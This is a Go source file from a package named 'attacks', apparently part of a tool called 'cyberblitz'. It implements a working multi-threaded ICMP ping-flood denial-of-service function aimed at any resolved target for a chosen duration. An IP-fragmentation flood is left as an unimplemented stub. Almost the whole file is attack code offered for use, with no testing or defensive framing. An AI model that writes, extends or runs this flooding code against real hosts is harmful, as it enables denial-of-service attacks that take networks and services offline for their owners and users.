package attacks

import (
	"context"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// ICMPFlood performs an ICMP (ping) flood.
// NOTE: This function requires raw socket access, which typically means running with sudo on Linux.
func ICMPFlood(ctx context.Context, target string, duration int, threads int) {
	fmt.Printf("Starting ICMP Flood on %s for %d seconds with %d threads.\n", target, duration, threads)

	// Resolve the target address
	dstIP, err := net.ResolveIPAddr("ip4", target)
	if err != nil {
		fmt.Printf("Error resolving target address: %v\n", err)
		return
	}

	// Create a raw socket connection.
	// Using ListenPacket allows us to send IP packets without being root on some systems,
	// but it's not guaranteed. For ICMP, we often need more privileges.
	// Let's try creating a raw socket which is more likely to work with sudo.
	conn, err := net.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		fmt.Printf("Error creating raw socket: %v. Try running with sudo.\n", err)
		return
	}
	defer conn.Close()

	// Construct the ICMP packet
	icmpLayer := layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0),
	}
	payload := []byte("cyberblitz-icmp-flood")

	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
	}
	gopacket.SerializeLayers(buffer, opts, &icmpLayer, gopacket.Payload(payload))
	packetData := buffer.Bytes()

	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(ctx, time.Duration(duration)*time.Second)
	defer cancel()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if _, err := conn.WriteTo(packetData, dstIP); err != nil {
						// Don't flood console
						time.Sleep(time.Second)
						continue
					}
					time.Sleep(time.Millisecond)
				}
			}
		}()
	}

	wg.Wait()
	fmt.Println("ICMP Flood attack finished.")
}

// IPFragmentFlood is a placeholder for the IP Fragmentation attack
func IPFragmentFlood(ctx context.Context, target string, duration int, threads int) {
	fmt.Printf("IP Fragment Flood not yet implemented.\n")
}
